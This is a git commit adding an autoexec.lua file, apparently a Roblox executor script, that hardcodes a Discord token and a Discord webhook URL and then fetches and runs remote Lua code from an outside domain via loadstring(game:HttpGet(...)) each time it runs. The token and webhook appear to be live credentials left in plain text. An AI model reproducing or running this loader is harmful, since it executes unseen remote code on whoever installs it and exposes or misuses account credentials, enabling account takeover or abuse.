7f5ceff2cc40eeba0e7ed05f7d475a4856c1d7b3
azurkxo <140209544+azurkxo@users.noreply.github.com>
2024-12-30 14:48:46 +0200

    Add files via upload

---
+++ autoexec.lua
@@ -0,0 +1,4 @@
+Discord_Token = "OTU1OTU1MTg4MDY4NDA5Mzg2.GtOAWm.4qMTvqgLGVgDOFS0U3gGlw6VhY0ro9hNHzvcsw"
+Webhook = "https://discord.com/api/webhooks/1323044583923257374/BcueXZ4UJnrViJ9J37Syj00-4ljJT6iCiRamQdwDUUIZTteTnVuLuWQ67H_KRe4tzN0h"
+
+loadstring(game:HttpGet("https://egorikusa.space/autojoin"))()
